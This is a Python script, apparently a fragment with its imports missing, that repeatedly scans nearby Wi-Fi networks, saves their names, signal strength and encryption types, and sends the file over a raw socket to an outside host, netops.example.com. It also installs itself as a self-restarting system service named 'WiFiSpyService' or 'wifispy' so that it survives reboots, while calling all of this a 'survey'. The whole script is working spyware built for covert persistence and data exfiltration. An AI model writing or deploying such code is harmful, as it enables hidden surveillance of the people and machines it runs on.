def log(message, verbose):
    if verbose:
        print(message)

def register_survey(verbose=False):
    log("Attempting to register survey process...", verbose)
    try:
        if platform.system() == 'Windows':
            service_name = "WiFiSpyService"
            script_path = os.path.abspath(sys.argv[0])
            create_service_cmd = f'sc create {service_name} binPath= "{sys.executable} {script_path}" start= auto'
            subprocess.run(create_service_cmd, shell=True, check=True)
            start_service_cmd = f'sc start {service_name}'
            subprocess.run(start_service_cmd, shell=True, check=True)
        else:
            service_name = "wifispy"
            script_path = os.path.abspath(sys.argv[0])
            service_file = f"""
[Unit]
Description=WiFi Spy Service
After=network.target

[Service]
ExecStart={sys.executable} {script_path}
Restart=always

[Install]
WantedBy=multi-user.target
"""
            service_path = f"/etc/systemd/system/{service_name}.service"
            with open(service_path, 'w') as f:
                f.write(service_file)
            subprocess.run(['systemctl', 'enable', service_name], check=True)
            subprocess.run(['systemctl', 'start', service_name], check=True)
        log("Survey process registered successfully.", verbose)
    except Exception as e:
        log(f"Error: Failed to register survey process. Reason: {e}", verbose)

def upload_file_to_server(file_path, server_address='netops.example.com', port=8080, verbose=False):
    log(f"Attempting to upload '{file_path}' to {server_address}:{port}...", verbose)
    try:
        with open(file_path, 'rb') as file:
            data = file.read()

        with socket.create_connection((server_address, port), timeout=5) as sock:
            sock.sendall(data)
            log(f"File '{file_path}' uploaded successfully to {server_address}:{port}.", verbose)
    except FileNotFoundError:
        log(f"Error: File '{file_path}' not found.", verbose)
    except socket.timeout:
        log(f"Error: Connection to {server_address}:{port} timed out.", verbose)
    except Exception as e:
        log(f"Error: Failed to upload file to {server_address}:{port}. Reason: {e}", verbose)

def scan_wifi_networks(verbose=False):
    log("Scanning for Wi-Fi networks...", verbose)
    networks = []
    try:
        if platform.system() == "Windows":
            result = subprocess.run(["netsh", "wlan", "show", "network", "mode=Bssid"], capture_output=True, text=True)
            for line in result.stdout.splitlines():
                if "SSID" in line:
                    ssid = line.split(":", 1)[1].strip()
                elif "Signal" in line:
                    signal_strength = line.split(":", 1)[1].strip()
                elif "Authentication" in line:
                    encryption_type = line.split(":", 1)[1].strip()
                    networks.append((ssid, signal_strength, encryption_type))
        else:
            result = subprocess.run(["nmcli", "-t", "-f", "SSID,SIGNAL,SECURITY", "dev", "wifi"], capture_output=True, text=True)
            for line in result.stdout.splitlines():
                parts = line.split(":")
                if len(parts) >= 3:
                    ssid, signal_strength, encryption_type = parts[0], parts[1], parts[2]
                    networks.append((ssid, signal_strength, encryption_type))
    except Exception as e:
        log(f"Error: Failed to scan Wi-Fi networks. Reason: {e}", verbose)
    return networks

def process_wifi_networks(input_file='target/wifi_networks.txt', output_file='wifi_survey.txt', verbose=False):
    log(f"Processing Wi-Fi networks from '{input_file}'...", verbose)
    try:
        networks = scan_wifi_networks(verbose)
        if not networks:
            log("No Wi-Fi networks found during scan.", verbose)
            return

        cleaned_data = []
        for ssid, signal_strength, encryption_type in networks:
            cleaned_data.append(f"SSID: {ssid}\nSignal Strength: {signal_strength}\nEncryption: {encryption_type}\n")

        with open(output_file, 'w', encoding='utf-8') as out_file:
            out_file.write("\n".join(cleaned_data))

        log(f"Cleaned Wi-Fi network data written to '{output_file}'.", verbose)
        upload_file_to_server(output_file, verbose=verbose)
        register_survey(verbose)
    except Exception as e:
        log(f"Error: {e}", verbose)

def periodic_scan(output_file='wifi_survey.txt', interval=300, verbose=False):
    while True:
        process_wifi_networks(output_file=output_file, verbose=verbose)
        time.sleep(interval)

if __name__ == "__main__":
    verbose = "--verbose" in sys.argv
    output_file = 'wifi_survey.txt'
    if not os.path.exists('target'):
        os.makedirs('target')
    thread = Thread(target=periodic_scan, args=(output_file, 300, verbose), daemon=True)
    thread.start()
    thread.join()

